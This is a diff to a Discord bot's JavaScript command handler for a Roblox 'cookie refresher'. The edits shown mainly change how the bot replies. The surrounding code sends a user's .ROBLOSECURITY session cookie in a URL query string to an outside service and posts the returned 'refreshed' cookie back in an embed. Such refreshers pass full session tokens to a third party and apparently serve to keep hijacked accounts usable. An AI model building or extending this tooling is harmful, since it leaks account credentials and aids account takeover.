@@ -2323,7 +2323,8 @@ client.on('interactionCreate', async interaction => {
       cookie = cookie.substring(warningPrefix.length);
     }
 
-    await interaction.reply({ content: '<:Refresh:1393888531973406881> Refreshing your cookie...', ephemeral: true });
+    // Defer the reply to show loading state
+    await interaction.deferReply();
 
     try {
       const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
@@ -2338,7 +2339,7 @@ client.on('interactionCreate', async interaction => {
             text: `Requested by ${interaction.user.tag}`,
             iconURL: interaction.user.displayAvatarURL()
           });
-        return interaction.followUp({ embeds: [errorEmbed] });
+        return interaction.editReply({ embeds: [errorEmbed] });
       }
 
       const refreshed = data.redemptionResult.refreshedCookie;
@@ -2387,8 +2388,10 @@ client.on('interactionCreate', async interaction => {
         { name: "Status", value: "<:yes:1393890949960306719> Completed", inline: true }
       );
 
-      await interaction.followUp({ embeds: [publicEmbed] }); // public message
+      // Send the public embed as the main reply
+      await interaction.editReply({ embeds: [publicEmbed] });
 
+      // Send the private cookie as a follow-up
       const privateEmbed = new EmbedBuilder()
         .setColor(0x2C2F33)
         .setTitle("Your New .ROBLOSECURITY Cookie")
@@ -2417,7 +2420,7 @@ client.on('interactionCreate', async interaction => {
           text: `Requested by ${interaction.user.tag}`,
           iconURL: interaction.user.displayAvatarURL()
         });
-      await interaction.followUp({ embeds: [embed] });
+      await interaction.editReply({ embeds: [embed] });
     }
   }
 
